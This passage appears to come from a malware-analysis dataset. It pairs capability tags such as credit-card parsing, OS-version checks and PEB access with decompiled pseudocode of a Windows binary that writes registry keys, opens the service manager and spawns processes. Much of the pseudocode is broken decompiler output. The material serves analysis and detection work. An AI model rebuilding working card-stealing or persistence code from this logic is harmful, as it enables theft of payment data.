uVar19;\n    uint in_stack_ffffffa8;\n    uint arg_ch;\n    uchar *arg_18h;\n    uint arg_1ch;\n    int32_t *arg_20h;\n    uchar uStack40;\n    uint uStack39;\n    uint uStack8;\n    \n    uVar9 = param_2;\n    uVar10 = param_2 >> 8;\n    uVar16 = CARRY1(uVar9, uVar10);\n    bVar17 = (POPCOUNT(uVar9 + uVar10) & 1U) == 0;\n    if ((bVar17) || (!bVar17)) {\n        if ((bVar17) || (!bVar17)) goto code_r0x004013ec;\n        ppcVar2 = segment(in_SS, *0x10 + -0x34);\n        in_EAX = *ppcVar2;\n    }\n    else {\n        puVar14 = unaff_ESI + 1;\n        out(*unaff_ESI, param_2);\n        uVar16 = in_AF;\n        do {\n            cVar18 = in_EAX >> 8;\n            uVar16 = 9 < (in_EAX & 0xf) | uVar16;\n            in_EAX = CONCAT31(CONCAT21(in_EAX >> 0x10, cVar18 - uVar16), -uVar16);\n            unaff_ESI = puVar14;\n            in_AF = uVar16;\n        } while (uVar16 || cVar18 == *param_2);\n    }\n    *(unaff_EDI + param_2 * 2) = (*(unaff_EDI + param_2 * 2) + 0x7b) - uVar16;\n    *(param_1 + 0xf) = in_EAX;\n    unaff_EBX = unaff_EBX & 0xffffff00 | *unaff_ESI;\n    *in_EAX = *in_EAX + in_EAX;\n    in_EAX[0x66] = in_EAX[0x66] + uVar9;\n    *0xf58ea42 = *0xf58ea42 + 'B';\n    puVar1 = unaff_EDI + 0x58;\n    uVar16 = *puVar1;\n    *puVar1 = *puVar1 - 0x16;\n    if (0x15 < uVar16) {\n        return 0xf58ea42;\n    }\n    puVar6 = 0xf58ea42;\n    if ((POPCOUNT(*puVar1) & 1U) == 0) {\n        do {\n            if (param_1 == *unaff_ESI) {\n                param_1 = unaff_EDI + -1;\n                bVar17 = true;\n                puVar11 = puVar6;\n                do {\n                    unaff_ESI = unaff_ESI + 1;\n                    puVar11 = puVar11 + 1;\n                    if (param_1 == NULL) break;\n                    param_1 = param_1 - 1;\n                    bVar17 = *puVar11 == *unaff_ESI;\n                } while (bVar17);\n                unaff_ESI = param_5;\n                unaff_EDI = param_6;\n                if (bVar17) {\n                    return puVar6;\n                }\n            }\n            puVar11 = puVar6 + 1;\n            if (0xb7bc9ea5 < puVar11) {\n                return NULL;\n            }\n            if ((0xb7bc9ea4 < puVar11) && (0xb7bc9ea4 >= puVar11)) {\n                if (&stack0xffffffcc < *puVar11 || puVar6 == 0xfffffffe) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                return param_1;\n            }\n            param_1 = param_1 & 0xffffff00 | *puVar11;\n            puVar6 = puVar11;\n        } while( true );\n    }\ncode_r0x004013ec:\n    uStack8 = fcn.00401300(param_7, param_8, 0x407054, 7);\n    pcVar4 = _sym.imp.MSVCRT.dll_rand;\n    if (uStack8 == NULL) {\n        return NULL;\n    }\n    pcVar7 = NULL;\n    uStack40 = 0;\n    puVar14 = &uStack40 + 1;\n    for (iVar8 = 7; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    *puVar14 = 0;\n    *(puVar14 + 2) = 0;\n    bVar17 = false;\n    uVar12 = 0;\n    do {\n        if ((!bVar17) && (bVar17)) {\n            cVar5 = SUB41(pcVar7, 0);\n            cVar18 = cVar5 - *pcVar4;\n            func_0x101873d2((in_NT & 1) * 0x4000 | SBORROW1(cVar5, *pcVar4) * 0x800 | (in_IF & 1) * 0x200 |\n                            (in_TF & 1) * 0x100 | (cVar18 < '\\0') * 0x80 | (cVar18 == '\\0') * 0x40 | (in_AF & 1) * 0x10\n                            | ((POPCOUNT(cVar18) & 1U) == 0) * 4 | cVar5 < *pcVar4 | (in_ID & 1) * 0x200000 |\n                            (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar19 = (*pcVar4)();\n        pcVar7 = uVar19 & 0x800000ff;\n        if (pcVar7 < 0) {\n            pcVar7 = (pcVar7 + -1 | 0xffffff00) + 1;\n        }\n        (&uStack40)[uVar12] = pcVar7;\n        uVar12 = uVar12 + 1;\n        bVar17 = uVar12 < 0x20;\n    } while (bVar17);\n    bVar17 = pcVar4 < pcVar7;\n    cVar18 = pcVar4 == pcVar7;\n    piVar13 = &uStack40;\n    piVar15 = uStack8;\n    for (iVar8 = 8; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *piVar15 = *piVar13;\n        piVar13 = piVar13 + 1;\n        piVar15 = piVar15 + 1;\n    }\n    if ((!bVar17) && (bVar17)) {\n        puVar6 = unaff_EBX + 0x69 + (uVar19 >> 0x20) * 4;\n        uVar12 = bVar17;\n        uVar3 = unaff_EBX + *puVar6;\n        bVar17 = CARRY4(unaff_EBX, *puVar6) || CARRY4(uVar3, uVar12);\n        cVar18 = uVar3 + uVar12 == 0;\n    }\n    arg_18h = &uStack40;\n    arg_1ch = 0x20;\n    arg_20h = uStack8;\n    while (((uVar16 = fcn.00403f50(param_3, param_4, param_5, param_6, arg_18h, arg_1ch, arg_20h),  param_5 = param_8, \n            arg_ch = param_7,  !bVar17 && (bVar17)) &&\n           (param_5 = extraout_ECX + -1,  arg_ch = in_stack_ffffffa8,  param_5 != NULL && cVar18 != '\\0'))) {\n        *(extraout_EDX + -0x75) = *(extraout_EDX + -0x75) & extraout_EDX;\n        bVar17 = false;\n        cVar18 = (uVar16 | 0x50) == 0;\n        param_4 = extraout_EDX;\n        param_6 = &stack0xfffffffc;\n    }\n    iVar8 = *piVar13;\n    *piVar15 = piVar13 + 1;\n    *(param_5 + 0x52) = (*(param_5 + 0x52) - (iVar8 >> 0x1f)) - (*0x9750e2b5 < 0x8b || *0x9750e2b5 + 0x75 < bVar17);\n    fcn.00401a50(&uStack8 + 3, arg_ch);\n    return 0x1;\n}\n",
        "token_count": 2378
    },
    "00401a50": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ac4) overlaps instruction at (ram,0x00401ac2)\n// \n// WARNING: Removing unreachable block (ram,0x00401ac4)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401a50(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    char extraout_CH;\n    uint32_t unaff_EDI;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00402960(arg_8h, arg_ch, &var_8h, &var_4h);\n    if (iVar1 != 0) {\n        *(iVar1 + 0x58) = var_4h;\n        if (('\\x04' < extraout_CH + -1) && (extraout_CH + -1 < '\\x05')) {\n            *(unaff_EDI | &stack0xfffffffc) = iVar1;\n        }\n        fcn.00402960(arg_8h, arg_ch, &var_8h, &var_4h);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 269
    },
    "00402540": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004025fb) overlaps instruction at (ram,0x004025f7)\n// \n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall fcn.00402540(uint32_t param_1, uint32_t param_2)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    uint32_t in_EAX;\n    char extraout_CH;\n    char cVar3;\n    uint32_t extraout_ECX;\n    ushort extraout_DX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint16_t unaff_BX;\n    uint *puVar6;\n    uint *unaff_EBP;\n    uchar *unaff_ESI;\n    uchar *puVar7;\n    uchar *puVar8;\n    uint16_t unaff_DI;\n    ushort in_SS;\n    bool bVar9;\n    bool bVar10;\n    uchar uVar11;\n    char cVar12;\n    char cVar13;\n    ulong uVar14;\n    ushort in_stack_ffffa185;\n    ushort in_stack_ffffa187;\n    ushort in_stack_ffffa189;\n    ushort in_stack_ffffa18b;\n    ushort in_stack_ffffa18d;\n    ushort uVar15;\n    ushort in_stack_ffffa18f;\n    ushort uVar16;\n    uint in_stack_ffffffb8;\n    uint in_stack_ffffffbc;\n    uint32_t uVar17;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint arg_14h;\n    \n    bVar9 = false;\n    uVar4 = (param_2 & 0xffffff00 | param_1 >> 8 & 0xff) & in_EAX;\n    uVar11 = uVar4 < 0;\n    bVar10 = uVar4 == 0;\n    fcn.004011a0(0x4224f4, 0xb, 0x40738c, 0x20);\n    if ((!bVar9 && !bVar10) && (bVar9 || bVar10)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_14h = 0x40257f;\n    uVar14 = fcn.004011a0(0x4224f4, 0xb, 0x4073ac, 0x26);\n    if ((uVar11) || (!uVar11)) {\n        arg_14h = 8;\n        in_stack_ffffffcc = 0x4073d4;\n        in_stack_ffffffc8 = 0xb;\n    }\n    else if (uVar14 < 0x2b97f796) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    pcVar1 = (uVar14 >> 0x20) + 0xb;\n    cVar13 = SCARRY1(*pcVar1, extraout_CH);\n    *pcVar1 = *pcVar1 + extraout_CH;\n    cVar12 = *pcVar1 < '\\0';\n    uVar17 = 0x4025a0;\n    uVar14 = fcn.004011a0(0x4224f4, in_stack_ffffffc8, in_stack_ffffffcc, arg_14h);\n    iVar5 = uVar14 >> 0x20;\n    puVar7 = uVar14;\n    uVar4 = extraout_ECX;\n    if (cVar13 == cVar12) {\n        uVar17 = uVar17 & 0xffff | extraout_ECX << 0x10;\n        uVar4 = extraout_ECX & 0xffff;\n        cVar3 = (extraout_ECX << 0x10) >> 0x18;\n        if (cVar13 == cVar12) goto code_r0x004025b5;\n        puVar2 = unaff_ESI + -0x24;\n        puVar6 = *puVar2;\n        *puVar2 = *puVar2 - unaff_EBP;\n        unaff_ESI = puVar7;\n        if (unaff_EBP <= puVar6) {\n            pcVar1 = iVar5 + 0xb;\n            *pcVar1 = *pcVar1 + cVar3;\n            goto code_r0x004025fe;\n        }\n    }\n    else {\ncode_r0x004025b5:\n        cVar3 = uVar4 >> 8;\n        uVar17 = 0x19;\n        in_stack_ffffffbc = 0x4073dc;\n        in_stack_ffffffb8 = 0xb;\n    }\n    pcVar1 = iVar5 + 0xb;\n    *pcVar1 = *pcVar1 + cVar3;\n    fcn.004011a0(0x4224f4, in_stack_ffffffb8, in_stack_ffffffbc, uVar17);\n    if ((*0x10 != 0xc) && (*0x10 == 0xc)) {\n        puVar6 = 0xfffffffc;\n        cVar12 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *unaff_EBP;\n            cVar12 = cVar12 + -1;\n        } while ('\\0' < cVar12);\n    }\n    fcn.004011a0(0x4224f4, 0xb, 0x4073f8, 0xb);\n    in_stack_ffffa18d = 0x12;\n    in_stack_ffffa18f = 0;\n    in_stack_ffffa189 = 0x7404;\n    in_stack_ffffa18b = 0x40;\n    in_stack_ffffa185 = 0xb;\n    in_stack_ffffa187 = 0;\n    puVar7 = unaff_ESI;\ncode_r0x004025fe:\n    fcn.004011a0(0x4224f4, CONCAT22(in_stack_ffffa187, in_stack_ffffa185), \n                 CONCAT22(in_stack_ffffa18b, in_stack_ffffa189), CONCAT22(in_stack_ffffa18f, in_stack_ffffa18d));\n    fcn.004011a0(0x4224f4, 0xb, 0x407418, 0x12);\n    bVar9 = (unaff_DI | 0x2fff) - unaff_BX == 0x7174;\n    fcn.004011a0(0x4224f4, 0xb, 0x40742c, 2);\n    puVar8 = puVar7;\n    if ((!bVar9) && (bVar9)) {\n        puVar8 = puVar7 + 1;\n        out(*puVar7, extraout_DX);\n    }\n    fcn.004011a0(0x4224f4, 0xb, 0x407430, 8);\n    fcn.004011a0(0x4224f4, 0xb, 0x407438, 8);\n    fcn.004011a0(0x4224f4, 0xb, 0x407440, 6);\n    uVar15 = 7;\n    uVar16 = 0;\n    do {\n        fcn.004011a0(0x4224f4, 0xb, 0x407448, CONCAT22(uVar16, uVar15));\n        fcn.004011a0(0x4224f4, 0xb, 0x407450, 7);\n        bVar9 = false;\n        bVar10 = (POPCOUNT(((unaff_BX ^ puVar8) >> 8) - 1U & 0xd) & 1U) == 0;\n        uVar15 = 6;\n        uVar16 = 0;\n        fcn.004011a0(0x4224f4, 0xb, 0x407458, 6);\n        if ((bVar10) || (!bVar10)) break;\n        segment(in_SS, *0x10 + -0x5e7f);\n        if (bVar9) goto code_r0x004027a0;\n    } while (bVar10);\n    fcn.004011a0(0x4224f4, 0xb, 0x407460, 0x25);\ncode_r0x004027a0:\n    fcn.004011a0(0x4224f4, 0xb, 0x407488, 8);\n    return;\n}\n",
        "token_count": 1925
    },
    "004032d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004032d0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(*0x10 + -0x164, 0x708c, arg_8h);\n    (*pcVar2)(*0x10 + -0x268, 0x70a4, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4070cc;\n    var_30h = 0x4070d8;\n    var_2ch = 0x4070e4;\n    var_28h = 0x4070f4;\n    var_24h = 0x4070fc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1100
    },
    "00403910": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00403910(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "00403f00": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00403f00(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.004019a0(0x80000002, 0x4071d8, 0x407224, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 134
    },
    "004042c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004042c0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    char cVar5;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBX;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint8_t in_AF;\n    unkbyte6 Var8;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    Var8 = (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    uVar2 = Var8;\n    cVar5 = Var8 >> 8;\n    uVar3 = (CONCAT11(cVar5 + -0x2b, uVar2) ^ 0x3d) + 0x7c28 ^\n            (Var8 >> 0x20 & 0xff | (Var8 >> 0x28 | Var8 >> 0x20) << 8);\n    var_14h = 0x407440;\n    var_10h = 0x407438;\n    var_ch = 0x407448;\n    var_8h = 0x407450;\n    var_4h = 0x407458;\n    if ((uVar3 != 0x4001) && (uVar3 == 0x4001)) {\n        if (uVar3 < 0x4001 || unaff_EBX + 1 == 0) {\n            return Var8;\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        piVar1 = (Var8 & 0xffff0000 | CONCAT11(cVar5 + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    uVar6 = 0;\n    puVar7 = &var_14h;\n    do {\n        iVar4 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *puVar7);\n        if (iVar4 != 0) {\n            return 1;\n        }\n        uVar6 = uVar6 + 1;\n        puVar7 = puVar7 + 1;\n    } while (uVar6 < 5);\n    iVar4 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x407430);\n    return iVar4 == 0;\n}\n",
        "token_count": 588
    },
    "00401830": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401830(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 != 0) {\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n        (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n        (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 131
    },
    "00401b40": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401b40(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    \n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.00404bf0(arg_8h_00, arg_8h);\n    uVar1 = fcn.00403e30(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 146
    },
    "004019a0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004019a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 186
    },
    "004021b0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004024f7) overlaps instruction at (ram,0x004024f2)\n// \n\nvoid fcn.004021b0(void)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    uint8_t extraout_AH;\n    int32_t iVar3;\n    uint8_t extraout_CH;\n    uint8_t *unaff_EDI;\n    uint16_t in_SS;\n    bool bVar4;\n    uint8_t in_AF;\n    uchar uVar5;\n    char cVar6;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar7;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t arg_14h;\n    uint arg_14h_00;\n    uint32_t uVar8;\n    \n    bVar4 = false;\n    uVar8 = 0x4021d1;\n    uVar1 = fcn.004011a0(0x4224f4, 0xb, 0x407010, 0x11);\n    if ((bVar4) || (uVar8 = uVar8 & 0xffff | unaff_EDI << 0x10,  !bVar4)) {\n        uVar8 = 0xf;\n    }\n    cVar6 = uVar1 - *unaff_EDI;\n    arg_14h = (in_NT & 1) * 0x4000 | SBORROW1(uVar1, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n              (cVar6 < '\\0') * 0x80 | (cVar6 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar6) & 1U) == 0) * 4 |\n              uVar1 < *unaff_EDI | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n              (in_AC & 1) * 0x40000;\n    func_0x1018815b(arg_14h, uVar8);\n    fcn.004011a0(0x4224f4, 0xb, 0x40722c, arg_14h);\n    fcn.004011a0(0x4224f4, 0xb, 0x40723c, 0x1a);\n    fcn.004011a0(0x4224f4, 0xb, 0x407290, 10);\n    fcn.004011a0(0x4224f4, 0xb, 0x40729c, 0xb);\n    cVar7 = false;\n    cVar6 = '\\0';\n    uVar5 = ((extraout_CH ^ extraout_AH) + 1 & 0x27) == 0;\n    iVar3 = fcn.004011a0(0x4224f4, 0xb, 0x4072a8, 8);\n    if ((!cVar7) && (cVar7)) {\n        LOCK();\n        cVar7 = SCARRY4(iVar3, 0x658f517f);\n        cVar6 = iVar3 + 0x658f517f < 0;\n        uVar5 = iVar3 == -0x658f517f;\n    }\n    arg_14h_00 = 0x4022d5;\n    fcn.004011a0(0x4224f4, 0xb, 0x4072b0, 9);\n    if ((uVar5 || cVar7 != cVar6) || (!uVar5 && cVar7 == cVar6)) {\n        arg_14h_00 = 9;\n    }\n    fcn.004011a0(0x4224f4, 0xb, 0x4072bc, arg_14h_00);\n    if ((!cVar7) && (cVar7)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.004011a0(0x4224f4, 0xb, 0x4072c8, 9);\n    fcn.004011a0(0x4224f4, 0xb, 0x4072d4, 0xc);\n    fcn.004011a0(0x4224f4, 0xb, 0x4072e0, 3);\n    fcn.004011a0(0x4224f4, 0xb, 0x4072e4, 10);\n    fcn.004011a0(0x4224f4, 0xb, 0x4072f0, 0x40);\n    fcn.004011a0(0x4224f4, 0xb, 0x407330, 0xc);\n    fcn.004011a0(0x4224f4, 0xb, 0x40733c, 0xb);\n    fcn.004011a0(0x4224f4, 0xb, 0x407348, 4);\n    fcn.004011a0(0x4224f4, 0xb, 0x40734c, 4);\n    fcn.004011a0(0x4224f4, 0xb, 0x407350, 0xc);\n    uVar2 = fcn.004011a0(0x4224f4, 0xb, 0x40735c, 4);\n    bVar4 = (POPCOUNT((unaff_EDI + 1 & uVar2) + 0xaf70 & 0xc) & 1U) == 0;\n    fcn.004011a0(0x4224f4, 0xb, 0x407360, 9);\n    if ((bVar4) || (!bVar4)) {\n        uVar8 = 0x16;\n    }\n    else {\n        uVar8 = unaff_EDI + 1 & 0xffff0000 | in_SS;\n    }\n    fcn.004011a0(0x4224f4, 0xb, 0x40736c, uVar8);\n    fcn.004011a0(0x4224f4, 0xb, 0x407384, 7);\n    return;\n}\n",
        "token_count": 1520
    },
    "004049e0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404afe) overlaps instruction at (ram,0x00404afc)\n// \n// WARNING: Removing unreachable block (ram,0x00404af0)\n// WARNING: Removing unreachable block (ram,0x00404af7)\n// WARNING: Removing unreachable block (ram,0x00404b36)\n\nvoid fcn.004049e0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uchar uStack612;\n    uint uStack611;\n    uchar uStack352;\n    uint uStack351;\n    uint auStack92 [11];\n    uint uStack48;\n    ushort uStack44;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    fcn.00402540();\n    iVar4 = fcn.004041c0();\n    if (iVar4 != 0) {\n        uStack612 = 0;\n        puVar5 = &uStack611;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = 0;\n        *(puVar5 + 2) = 0;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &uStack612, 0x26, 0);\n        if (iVar4 != 0) {\n            fcn.004027c0();\n            uStack352 = 0;\n            puVar5 = &uStack351;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&uStack352, 0x4073ac, &uStack612, 0x40738c, 3);\n            pcVar3 = _sym.imp.USER32.dll_EnumWindows;\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            iStack24 = 0;\n            do {\n                puVar5 = auStack92;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                uStack44 = 0;\n                uStack20 = 0;\n                uStack16 = 0;\n                auStack92[0] = 0x44;\n                uStack12 = 0;\n                uStack48 = 1;\n                uStack8 = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &uStack352, 0, 0, 0, 0, 0, 0, auStack92, &uStack20);\n                if (iVar4 == 0) {\n                    return;\n                }\n                (*pcVar2)(3000);\n                (*pcVar3)(fcn.004048c0, uStack12);\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack20, 1000);\n                if (iVar4 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack20, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack16);\n                (*pcVar1)(uStack20);\n                iStack24 = iStack24 + 1;\n            } while (iStack24 < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 887
    },
    "00401bf0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401f84) overlaps instruction at (ram,0x00401f81)\n// \n// WARNING: Removing unreachable block (ram,0x00401d03)\n\nvoid fcn.00401bf0(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    int16_t iVar5;\n    uint8_t extraout_AH;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    char extraout_CH;\n    ushort extraout_CX;\n    uint extraout_ECX;\n    uint8_t extraout_CH_00;\n    uint32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint8_t uVar10;\n    int32_t extraout_ECX_02;\n    int32_t iVar9;\n    uint8_t extraout_CH_01;\n    int32_t extraout_ECX_03;\n    uint8_t extraout_DH;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t iVar11;\n    int32_t unaff_EBX;\n    uint *puVar12;\n    uint *unaff_EBP;\n    int32_t *unaff_ESI;\n    